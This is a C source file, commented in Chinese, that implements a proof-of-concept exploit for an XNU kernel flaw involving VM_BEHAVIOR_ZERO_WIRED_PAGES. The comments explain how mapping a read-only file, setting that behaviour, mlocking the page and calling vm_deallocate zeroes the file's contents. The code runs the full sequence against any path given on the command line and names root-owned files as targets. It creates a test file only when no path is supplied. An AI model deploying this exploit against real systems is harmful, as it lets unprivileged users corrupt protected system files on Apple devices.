/*
 * 有问题，联系pxx917144686
 *
 * XNU VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞利用
 * 
 * 该漏洞允许写入只读页面，通过以下步骤实现：
 * 1. 创建一个包含随机数据的文件
 * 2. 将文件设为只读
 * 3. 映射文件到内存
 * 4. 设置VM_BEHAVIOR_ZERO_WIRED_PAGES行为
 * 5. 使用mlock锁定内存
 * 6. 通过vm_deallocate触发漏洞
 * 
 * 漏洞原理：
 * VME定义了特定映射对特定vm_object区域的权限。当设置VM_BEHAVIOR_ZERO_WIRED_PAGES行为时，
 * 内核在entry中设置zero_wired_pages标志。在vm_map_delete中，如果带有非零wired_count的
 * entry从映射中删除，它会被传递给vm_fault_unwire，后者从底层对象查找页面（使用VM_PROT_NONE）。
 * 
 * 当entry->zero_wired_pages被设置时，内核将页面传递给pmap_zero_page，这时没有权限检查，
 * 直接在pmap层面将页面清零。
 * 
 * 利用关键点：
 * - 可以仅为读取而锁定页面（mlock只读页面是合法的）
 * - 不能锁定具有对称复制语义的对象的页面（在vm_map_wire_nested中强制执行）
 * - 但可以锁定延迟复制对象（例如vnode pager，即文件及其UBC页面）
 * 
 * 漏洞影响：
 * 可以打开只读的root所有文件，映射其中一页，标记为VM_BEHAVIOR_ZERO_WIRED_PAGES，
 * 然后mlock页面，最后vm_deallocate页面，文件中对应区域将被清零。
 *
 * 漏洞利用详细步骤：
 * 1. 使用open打开目标只读文件，获取文件描述符
 *    - 使用O_RDONLY标志确保文件以只读方式打开
 *    - 正常情况下，此文件不应可写入
 *
 * 2. 使用mmap映射文件页面到内存
 *    - 权限设置为PROT_READ（只读）
 *    - 映射类型为MAP_FILE | MAP_SHARED，建立文件与内存的共享映射
 *    - 这步确保了内存映射直接连接到文件内容
 *
 * 3. 调用vm_behavior_set设置VM_BEHAVIOR_ZERO_WIRED_PAGES标志
 *    - 这会在内核的vm_map_entry结构上设置zero_wired_pages标志位
 *    - 关键漏洞点：内核允许任何进程在任何映射上设置此标志
 * 
 * 4. 使用mlock锁定页面到物理内存（wired）
 *    - 增加页面的wired_count，确保页面不会被换出
 *    - 内核允许对只读页面执行mlock操作
 *    - 这为后续触发漏洞创建必要条件
 *
 * 5. 调用vm_deallocate解除映射
 *    - 触发内核中的vm_map_delete和vm_fault_unwire流程
 *    - 由于页面被锁定且设置了VM_BEHAVIOR_ZERO_WIRED_PAGES标志
 *    - 内核会调用pmap_zero_page，在物理内存层面清零页面
 *    - 由于操作发生在物理内存层面，绕过了虚拟内存的保护机制
 *
 * 结果：目标文件的对应页面内容被清零（全0），实现了对只读文件的写入
 */

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/stat.h>

// 添加在包含文件之后，函数定义之前
// 定义安全的chmod包装函数
static inline int safe_chmod(const char *path, int mode) {
    return chmod(path, (mode_t)mode);
}

// 定义常量
#define PAGE_SIZE 4096
#define EXPLOIT_SUCCESS 0
#define EXPLOIT_FAILED -1

// 映射文件为只读
void* map_file_page_ro(const char* path) {
  int fd = open(path, O_RDONLY);

  if (fd == -1) {
    printf("[-] 打开文件失败\n");
    return MAP_FAILED;
  }

  void* mapped_at = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
  close(fd);  // 映射后可关闭文件描述符

  if (mapped_at == MAP_FAILED) {
    printf("[-] 映射文件失败\n");
    return MAP_FAILED;
  }

  return mapped_at;
}

// 验证文件内容是否被修改
static bool verify_changes(const char* path, const unsigned char* original_content, size_t content_size) {
  int fd = open(path, O_RDONLY);
  if (fd == -1) {
    printf("[-] 验证时无法打开文件\n");
    return false;
  }

  char buffer[128] = {0};
  ssize_t bytes_read = read(fd, buffer, sizeof(buffer));
  close(fd);

  if (bytes_read <= 0) {
    printf("[-] 验证时无法读取文件内容\n");
    return false;
  }

  // 检查是否有零字节被写入
  bool has_zeros = false;
  for (int i = 0; i < bytes_read && i < content_size; i++) {
    if (buffer[i] == 0 && original_content[i] != 0) {
      has_zeros = true;
      break;
    }
  }

  printf("[*] 文件内容验证: %s\n", has_zeros ? "已被修改" : "未被修改");
  return has_zeros;
}

// 主要漏洞利用函数
int exploit_vm_behavior(const char *path) {
  printf("[+] 开始利用VM_BEHAVIOR_ZERO_WIRED_PAGES漏洞\n");
  printf("[+] 目标文件: %s\n", path);
  
  // 1. 映射文件为只读
  void* page = map_file_page_ro(path);
  if (page == MAP_FAILED) {
    return EXPLOIT_FAILED;
  }
  printf("[+] 成功映射文件到地址: 0x%016llx\n", (uint64_t)page);
  
  // 保存原始内容以便验证
  char original_content[128] = {0};
  memcpy(original_content, page, sizeof(original_content));
  printf("[+] 保存了原始内容用于验证\n");
  
  // 2. 设置内存行为
  kern_return_t kr = vm_behavior_set(mach_task_self(),
                             (vm_address_t)page,
                             PAGE_SIZE,
                             VM_BEHAVIOR_ZERO_WIRED_PAGES);
  if (kr != KERN_SUCCESS) {
    printf("[-] 设置VM_BEHAVIOR_ZERO_WIRED_PAGES失败: %s\n", mach_error_string(kr));
    return EXPLOIT_FAILED;
  }
  printf("[+] 成功设置VM_BEHAVIOR_ZERO_WIRED_PAGES\n");
  
  // 3. 锁定内存
  // 注意：与mach_vm_wire不同，mlock不需要root权限
  int mlock_err = mlock(page, PAGE_SIZE);
  if (mlock_err != 0) {
    printf("[-] mlock失败: %s\n", strerror(errno));
    return EXPLOIT_FAILED;
  }
  printf("[+] 成功锁定内存\n");
  
  // 4. 解除内存映射 (触发漏洞的关键步骤)
  kr = vm_deallocate(mach_task_self(),
                     (vm_address_t)page,
                     PAGE_SIZE);
  if (kr != KERN_SUCCESS) {
    printf("[-] vm_deallocate失败: %s\n", mach_error_string(kr));
    return EXPLOIT_FAILED;
  }
  printf("[+] 成功解除映射，已触发漏洞\n");
  
  // 5. 验证文件是否被修改
  if (verify_changes(path, (unsigned char*)original_content, sizeof(original_content))) {
    printf("[+] 漏洞利用成功：文件内容已被修改\n");
    return EXPLOIT_SUCCESS;
  } else {
    printf("[-] 漏洞利用可能失败：未检测到文件变化\n");
    return EXPLOIT_FAILED;
  }
}

// 创建测试文件
char* create_test_file(const char* filename) {
  printf("[+] 创建测试文件: %s\n", filename);
  
  // 使用绝对路径
  char* path = realpath(".", NULL);
  if (!path) {
    printf("[-] 无法获取当前目录\n");
    return NULL;
  }
  
  char* full_path = malloc(strlen(path) + strlen(filename) + 2);
  sprintf(full_path, "%s/%s", path, filename);
  free(path);
  
  // 创建并填充文件
  FILE* f = fopen(full_path, "w");
  if (!f) {
    printf("[-] 无法创建测试文件\n");
    free(full_path);
    return NULL;
  }
  
  // 填充'A'字符
  for (int i = 0; i < 0x8000; i++) {
    fputc('A', f);
  }
  fclose(f);
  
  // 设置只读权限
  if (safe_chmod(full_path, S_IRUSR | S_IRGRP | S_IROTH) != 0) {
    printf("[-] 无法设置文件权限为只读\n");
    free(full_path);
    return NULL;
  }
  
  printf("[+] 测试文件创建成功\n");
  return full_path;
}

// 主函数
int main(int argc, char** argv) {
  const char* path = NULL;
  char* test_file_path = NULL;
  int result = EXPLOIT_FAILED;
  
  printf("=== XNU VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞利用 ===\n");
  
  if (argc < 2) {
    printf("[*] 未指定目标文件，创建测试文件\n");
    test_file_path = create_test_file("test_file.txt");
    if (!test_file_path) {
      printf("[-] 无法创建测试文件，退出\n");
      return 1;
    }
    path = test_file_path;
  } else {
    path = argv[1];
  }
  
  // 执行漏洞利用
  result = exploit_vm_behavior(path);
  
  // 清理
  if (test_file_path) {
    // 恢复文件权限以便删除
    safe_chmod(test_file_path, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    // 删除测试文件
    if (unlink(test_file_path) == 0) {
      printf("[+] 已删除测试文件\n");
    }
    free(test_file_path);
  }
  
  return result;
}